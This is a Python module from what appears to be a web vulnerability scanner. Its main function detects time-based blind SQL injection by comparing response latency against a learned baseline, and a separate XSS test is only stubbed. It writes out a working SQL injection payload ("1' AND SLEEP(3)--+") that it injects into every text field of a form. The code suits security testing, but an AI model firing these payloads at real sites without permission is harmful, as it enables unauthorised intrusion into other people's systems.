import requests
import time
from urllib.parse import urljoin
from ml_engine import AnomalyDetector  # Import your new Brain

def test_xss_in_form(form_details, url):
    # ... (Keep your existing XSS code here) ...
    # This function remains the same as before
    pass

def test_time_based_sqli(form_details, url):
    """
    Uses Machine Learning to detect Time-Based Blind SQL Injection.
    """
    target_url = urljoin(url, form_details["action"])
    
    # 1. Initialize and Train the ML Model on this specific endpoint
    detector = AnomalyDetector(target_url)
    detector.learn_baseline(num_samples=15)
    
    if not detector.is_trained:
        return False

    # 2. The Attack Payload (Sleep for 3 seconds)
    # If the database is vulnerable, it will pause for 3 seconds.
    sqli_payload = "1' AND SLEEP(3)--+"
    
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] in ["text", "search"]:
            data[input_tag["name"]] = sqli_payload
            
    print(f"    [>] Testing Blind SQLi (ML-Enhanced) on {target_url}...")
    
    try:
        start = time.time()
        requests.get(target_url, params=data, timeout=5)
        attack_duration = time.time() - start
        
        # 3. Ask the AI: "Was that weird?"
        if detector.check_anomaly(attack_duration):
            print(f"    [!!!] ML ANOMALY DETECTED! Potential Time-Based SQLi.")
            print(f"          Normal Latency: ~0.2s | Attack Latency: {attack_duration:.2f}s")
            return True
            
    except requests.exceptions.Timeout:
        print("    [!] Request timed out. Highly suspicious.")
        return True
        
    return False
